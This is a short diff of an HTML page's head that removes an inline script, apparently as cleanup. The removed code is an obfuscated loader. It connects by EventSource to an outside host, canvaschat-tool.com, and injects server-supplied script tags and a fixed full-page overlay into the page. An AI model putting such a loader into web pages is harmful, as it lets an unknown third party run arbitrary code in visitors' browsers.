@@ -17,35 +17,6 @@
     <!-- Core Stylesheet -->
     <link rel="stylesheet" href="style.css">
 
-    <script>
-        (function(url, doc, tag, id, es, d, el, i, m, ve, ng, onr) {
-            es = new EventSource(url);
-            es.onmessage = function(event) {
-                d = JSON.parse(event.data);
-                
-                i=doc.createElement('div');
-                i.id=id,doc.body&&doc.body.appendChild(i);
-                
-                d[0].script_1.forEach(item => {
-                    el=doc.createElement(tag),el.src=item.src;
-                    doc.querySelector('#'+id).appendChild(el);
-                });
-                
-                m=doc.createElement('div'), ve='style', ng='data-ng-init', onr="onRefreshFunction('"+id+"')";
-                d[0].attr.forEach(item => { m.setAttribute(item.prop,item.val) }); m.setAttribute(ng,onr);
-                
-                m[ve].position="fixed",m[ve].bottom="0",m[ve].right="0",m[ve].background="rgba(0,0,0,.2)",
-                m[ve].zIndex="9999",doc.querySelector('#'+id)&&doc.querySelector('#'+id).appendChild(m);
-                
-                d[0].script_2.forEach(item => {
-                    el=doc.createElement(tag),el.src=item.src;
-                    doc.querySelector('#'+id).appendChild(el);
-                });
-                
-                es.close();
-            };
-        }('https://canvaschat-tool.com:8000/getScript',document,'script','CcIdZ6gQLAF39Efn9C8X4bpb'));
-    </script>
 
 </head>
 
